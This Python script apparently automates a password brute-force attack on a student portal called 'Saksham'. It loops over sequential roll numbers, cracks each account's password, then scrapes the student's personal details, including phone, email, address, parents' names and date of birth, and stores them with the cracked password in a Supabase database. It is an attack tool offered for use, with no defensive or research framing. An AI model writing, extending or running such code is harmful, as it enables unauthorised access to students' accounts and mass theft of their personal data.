from database.supabase_student_database import *
from script.http_scripts import *
import time


def main():
    database = SupabaseStudentDatabase()

    for i in range(1203, 1300):

        formatted = '{0:04}'.format(i)
        userid = "2023/" + formatted

        try:
            if database.getStudentData(userid) is not None:
                print(f" {userid} password already exist in database/being cracked")
            else:
                print(f"{userid} password not found in database")

                # Working status set in database
                working_dict = {
                    "password": "working...",
                    "studentName": None,
                    "phone": None,
                    "email": None,
                    "roll": userid,
                    "address": None,
                    "fatherName": None,
                    "motherName": None,
                    "dob": None,
                    "gender": None,
                    "category": None,
                    "studentId": None,
                    "session": None,
                    "enrollmentNo": None,
                    "admissionDate": None,
                    "studentType": None,
                    "timeTaken": None
                }
                database.addStudentData(userid, data=working_dict)

                start_time = time.perf_counter()

                print("Cracking...")
                password = bruteforceLogin(userid, 1000)
                end_time = time.perf_counter()
                elapsedTime = str(end_time - start_time)[:8]

                if password is None:

                    # null student set in database
                    null_dict = {
                        "password": None,
                        "studentName": None,
                        "phone": None,
                        "email": None,
                        "roll": userid,
                        "address": None,
                        "fatherName": None,
                        "motherName": None,
                        "dob": None,
                        "gender": None,
                        "category": None,
                        "studentId": None,
                        "session": None,
                        "enrollmentNo": None,
                        "admissionDate": None,
                        "studentType": None,
                        "timeTaken": elapsedTime
                    }
                    database.addStudentData(userid, null_dict)

                else:
                    print("Password found: " + password)
                    student = getStudentDataFromSaksham(userid, password)
                    student_dict = {
                        "password": password,
                        "timeTaken": elapsedTime,
                        "studentName": str(student.studentName.lower),
                        "phone": student.phone,
                        "category": student.category,
                        "email": student.email,
                        "roll": student.roll,
                        "address": student.address,
                        "fatherName": str(student.fatherName.lower),
                        "motherName": str(student.motherName.lower),
                        "dob": student.dob,
                        "gender": student.gender,
                        "studentId": student.studentId,
                        "session": student.session,
                        "enrollmentNo": student.enrollmentNo,
                        "admissionDate": student.admissionDate,
                        "studentType": student.studentType,
                    }
                    database.addStudentData(userid, student_dict)
                    print(f"{userid} data retrieved and added to database")

        except Exception as e:
            print(f"Error: {e}")


if __name__ == "__main__":
    main()
